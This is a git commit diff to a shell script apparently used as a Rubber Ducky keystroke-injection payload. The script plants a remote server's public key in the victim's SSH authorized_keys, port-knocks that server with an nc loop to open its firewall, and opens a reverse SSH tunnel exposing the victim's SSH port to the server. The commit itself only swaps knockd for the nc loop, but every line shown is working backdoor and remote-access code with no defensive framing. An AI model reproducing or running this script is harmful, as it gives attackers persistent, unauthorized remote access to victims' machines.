7eef15dab073823708c9b6910c1b8b18de1946bd
Desperationis <fork_important@pm.me>
2025-05-06 11:47:54 -0400

    Fix script

--- ducky/script.sh
+++ ducky/script.sh
@@ -2,8 +2,6 @@
 
 set -euo pipefail
 
-sudo apt-get install -y knockd
-
 # Allow server to login to us
 mkdir -p ~/.ssh
 chmod 700 ~/.ssh
@@ -11,7 +9,8 @@ echo "$SERVER_PUBLIC_KEY" >> ~/.ssh/authorized_keys
 chmod 600 ~/.ssh/authorized_keys
 echo "Injected server public key."
 
-# Bypass server firewall
-knock $C_SERVER $KNOCK_OPEN_TUNNEL -d 300
+# Bypass server firewall via knock
+for port in $KNOCK_OPEN_TUNNEL; do nc -zv $C_SERVER $port; sleep 0.1; done
+
 
 ssh -N -R $SERVER_TUNNEL_PORT:localhost:22 root@$SERVER_IP
